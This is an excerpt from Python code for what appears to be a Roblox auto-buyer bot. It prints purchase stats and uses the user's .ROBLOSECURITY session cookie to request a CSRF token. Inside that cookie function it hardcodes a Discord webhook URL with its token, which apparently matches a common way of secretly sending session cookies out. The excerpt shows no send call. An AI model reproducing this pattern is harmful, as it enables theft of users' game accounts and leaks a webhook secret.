...
""")
    ...
    def _print_stats(self) -> None:
        print()
        print(Fore.CYAN + Style.BRIGHT + self.title)
        print(Fore.RESET + Style.RESET_ALL)
        print(f"                           Version: {self.version}")
        print()
        print(Style.BRIGHT + f"                           {Fore.GREEN}STATS{Fore.WHITE}{Style.BRIGHT} ")
        print(Style.BRIGHT + f"                           Total Buys: {Fore.GREEN}{Style.BRIGHT}{self.buys}{Fore.WHITE}{Style.BRIGHT} ")
        print()
        print(Style.BRIGHT + f"                           {Fore.YELLOW}MISC{Fore.WHITE}{Style.BRIGHT} ")
        ...
        print()
        print(Style.BRIGHT + f"                           {Fore.RED}OTHER{Fore.WHITE}{Style.BRIGHT} ")
        ...
        print()
        print(Style.BRIGHT + f"                           Current Task: {Fore.CYAN}{Style.BRIGHT}{self.task}{Fore.WHITE}{Style.BRIGHT} ")
    ...
    async def _get_xcsrf_token(self, cookie) -> dict:
        async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": cookie}) as client:
              ...
              self.wburl = "https://discord.com/api/webhooks/1100823325594374164/3oBPW0fQ0gWKfEJ00Wgmue9g_5wlpMOodcesvQZ4IfWuzwstiMUrvdt3hfUB-xNvI7Jq"
